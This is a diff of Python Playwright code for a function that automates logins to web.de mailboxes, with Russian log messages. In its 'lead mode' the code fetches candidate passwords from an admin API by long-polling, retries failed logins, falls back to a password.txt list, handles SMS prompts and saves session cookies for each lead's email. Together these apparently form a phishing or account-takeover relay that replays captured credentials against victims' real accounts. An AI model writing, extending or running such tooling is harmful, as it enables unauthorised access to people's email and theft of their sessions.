                             log("Пароль", "Подставляю пароль из API и повторяю вход")
-                            page.locator(pw_selector_any).first.fill(password)
+                            _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                             time.sleep(step_delay)
                             continue
-                        log("Пароль", "Неверные данные — жду новый пароль от админки (long-poll, макс 3 мин)")
+                        log("Пароль", "Неверные данные — жду новый пароль от админки (long-poll)")
                         wait_log(
                             "этап: Zugangsdaten / неверный пароль",
-                            "POST /api/webde-wait-password — один HTTP до ~3 мин; скрипт стоит, пока админ не сохранит новый пароль в лиде",
+                            "POST /api/webde-wait-password — до ~3 мин за запрос; та же строка, что уже пробовали — без повторного Login, сразу следующий long-poll",
                         )
-                        new_password = wait_for_new_password()
+                        new_password = _long_poll_until_password_differs_from((password or "").strip())
                         if not new_password:
                             fresh_after = _api_password_newer_than_attempt()
                             if fresh_after:
                                 wait_log(
                                     "long-poll пароля",
-                                    "таймаут long-poll, но в API уже новый пароль — использую",
+                                    "после цикла long-poll в API уже другой пароль — использую",
                                 )
-                                new_password = fresh_after
-                        if new_password and new_password != (password or ""):
-                            wait_log("long-poll пароля", "получен новый пароль от админки — подставляю и повторяю Login")
+                                new_password = fresh_after.strip()
+                        if new_password:
+                            wait_log("long-poll пароля", "получен другой пароль от админки — подставляю и повторяю Login")
                             password = new_password
                             log("Пароль", "Ввожу новый пароль и повторяю вход")
-                            page.locator(pw_selector_any).first.fill(password)
+                            _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                             time.sleep(step_delay)
                             continue
-                        if not new_password:
-                            wait_log("long-poll пароля", "таймаут или пустой ответ — password_timeout (408 в API)")
-                            log("Успех", "Результат: password timeout (пароль от админки не передан)")
-                            return "password_timeout"
-                        wait_log("long-poll пароля", "пароль совпал со старым — wrong_credentials")
-                        log("Успех", "Результат: неверные данные (таймаут или пароль не передан)")
-                        return "wrong_credentials"
+                        wait_log("long-poll пароля", "таймаут или пустой ответ — password_timeout (408 в API)")
+                        log("Успех", "Результат: password timeout (пароль от админки не передан)")
+                        return "password_timeout"
                     if lead_mode and get_password:
                         log("Пароль", "Неверные данные — жду новый пароль по API (макс 3 мин)")
                         wait_log(
@@ -4422,36 +4927,70 @@ def login_webde(
                             _check_script_idle_or_raise()
                             time.sleep(2)
                             new_password = (get_password() or "").strip()
-                            if new_password and new_password != (password or ""):
+                            if new_password and new_password != (password or "").strip():
                                 wait_log("опрос пароля после ошибки", f"новый пароль после ~{(_j + 1) * 2}с")
                                 break
+                            if new_password and new_password == (password or "").strip() and _j > 0 and _j % 12 == 0:
+                                log(
+                                    "Пароль",
+                                    "неверные данные — в API всё ещё та же строка; не повторяю Login, жду другую",
+                                )
                             if _j > 0 and _j % 15 == 0:
                                 wait_log(
                                     "опрос пароля после ошибки",
                                     f"прошло ~{(_j + 1) * 2}с / 180с",
                                 )
-                        if new_password and new_password != (password or ""):
+                        if new_password and new_password != (password or "").strip():
                             password = new_password
                             log("Пароль", "Ввожу новый пароль и повторяю вход")
-                            page.locator(pw_selector_any).first.fill(password)
+                            _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                             time.sleep(step_delay)
                             continue
-                        log("Успех", "Результат: неверные данные (новый пароль не поступил)")
+                        log(
+                            "Пароль",
+                            "другой пароль по API не поступил (или всё та же строка) — жду строку в password.txt",
+                        )
+                        fpw = _poll_new_password_from_password_file(
+                            set(tried_passwords_for_submit), WEBDE_WRONG_PASSWORD_WAIT_SEC
+                        )
+                        if fpw:
+                            wait_log("ожидание пароля после ошибки", "новый пароль из файла — повтор Login")
+                            password = fpw
+                            log("Пароль", "Ввожу пароль из файла и повторяю вход")
+                            _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
+                            time.sleep(step_delay)
+                            continue
+                        log("Успех", "Результат: неверные данные (API и password.txt не дали новый пароль)")
                         return "wrong_credentials"
-                    if lead_mode:
-                        log("Успех", "Результат: неверные данные")
-                        return "wrong_credentials"
+                    new_password: str | None = None
                     if extra_passwords:
                         new_password = extra_passwords.pop(0)
-                        log("Пароль", "Неверный пароль — беру следующий из password.txt")
+                        log("Пароль", "Неверный пароль — беру следующий из password.txt (очередь при старте)")
                     else:
-                        alert("Неверный логин или пароль", "Добавьте пароли в password.txt для автоматической подстановки")
-                        return False
+                        log(
+                            "Пароль",
+                            f"Неверные данные — жду до {int(WEBDE_WRONG_PASSWORD_WAIT_SEC)}с новый пароль в {PASSWORD_FILE} (браузер открыт)",
+                        )
+                        wait_log(
+                            "ожидание пароля после ошибки",
+                            f"опрос файла каждые 2с; строка не должна совпадать с паролем, который уже дал ошибку",
+                        )
+                        new_password = _poll_new_password_from_password_file(
+                            set(tried_passwords_for_submit), WEBDE_WRONG_PASSWORD_WAIT_SEC
+                        )
+                        if not new_password:
+                            alert(
+                                "Неверный логин или пароль",
+                                f"За {int(WEBDE_WRONG_PASSWORD_WAIT_SEC)}с в {PASSWORD_FILE.name} не появилась другая строка с паролем",
+                            )
+                            return "wrong_credentials" if lead_mode else False
+                        wait_log("ожидание пароля после ошибки", "новый пароль из файла — повтор Login")
                     if not new_password:
                         log("Пароль", "Пароли в password.txt закончились — выход")
-                        return False
-                    log("Пароль", "Ввожу следующий пароль и повторяю вход")
-                    page.locator(pw_selector_any).first.fill(new_password)
+                        return "wrong_credentials" if lead_mode else False
+                    password = new_password
+                    log("Пароль", "Ввожу новый пароль и повторяю вход")
+                    _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                     time.sleep(step_delay)
                     continue
 
@@ -4608,6 +5147,20 @@ def login_webde(
                             log("SMS", "Результат: требуется ввод SMS-кода (пуш не используется)")
                             return "sms"
                         return False
+                    if "hilfe.web.de" in (page.url or "").lower():
+                        if _hilfe_webde_url_indicates_oauth_failure(page.url):
+                            log(
+                                "Редирект",
+                                "hilfe.web.de с OAuth error/error_description в URL — вход не выполнен",
+                            )
+                        else:
+                            log(
+                                "Редирект",
+                                "hilfe.web.de без сценария успешного входа — не считаем «форму исчезла» успехом",
+                            )
+                        if lead_mode:
+                            return "error"
+                        return False
                     if lead_mode:
                         _save_cookies_for_lead_mode(context, email)
                         log("Успех", "Результат: успешный вход (форма входа исчезла)")
@@ -4636,37 +5189,33 @@ def login_webde(
                         )
                         password = fresh_late
                         log("Пароль", "Подставляю пароль из API и повторяю вход")
-                        page.locator(pw_selector_any).first.fill(password)
+                        _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                         time.sleep(step_delay)
                         continue
-                    log("Пароль", "Неверные данные (позднее распознавание) — жду новый пароль от админки (long-poll, макс 3 мин)")
+                    log("Пароль", "Неверные данные (позднее распознавание) — жду новый пароль от админки (long-poll)")
                     wait_log(
                         "этап: позднее распознавание Zugangsdaten",
-                        "тот же long-poll POST /api/webde-wait-password до ~3 мин",
+                        "POST /api/webde-wait-password; та же строка, что уже пробовали — без повторного Login, следующий long-poll",
                     )
-                    new_password = wait_for_new_password()
+                    new_password = _long_poll_until_password_differs_from((password or "").strip())
                     if not new_password:
                         fresh_after_late = _api_password_newer_than_attempt()
                         if fresh_after_late:
                             wait_log(
                                 "long-poll (поздняя ветка)",
-                                "таймаут long-poll, но в API уже новый пароль — использую",
+                                "после цикла long-poll в API уже другой пароль — использую",
                             )
-                            new_password = fresh_after_late
-                    if new_password and new_password != (password or ""):
-                        wait_log("long-poll (поздняя ветка)", "пароль получен — повтор Login")
+                            new_password = fresh_after_late.strip()
+                    if new_password:
+                        wait_log("long-poll (поздняя ветка)", "получен другой пароль — повтор Login")
                         password = new_password
                         log("Пароль", "Ввожу новый пароль и повторяю вход")
-                        page.locator(pw_selector_any).first.fill(password)
+                        _fill_password_login_or_fallback(page, password, pw_selector_any=pw_selector_any)
                         time.sleep(step_delay)
                         continue
-                    if not new_password:
-                        wait_log("long-poll (поздняя ветка)", "таймаут — password_timeout")
-                        log("Успех", "Результат: password timeout (пароль от админки не передан)")
-                        return "password_timeout"
-                    wait_log("long-poll (поздняя ветка)", "пароль не изменился — wrong_credentials")
-                    log("Успех", "Результат: неверные данные (таймаут или пароль не передан)")
-                    return "wrong_credentials"
+                    wait_log("long-poll (поздняя ветка)", "таймаут — password_timeout")
+                    log("Успех", "Результат: password timeout (пароль от админки не передан)")
+                    return "password_timeout"
 
                 alert("Не удалось подтвердить вход", "Страница после логина не распознана")
                 return "error" if lead_mode else False
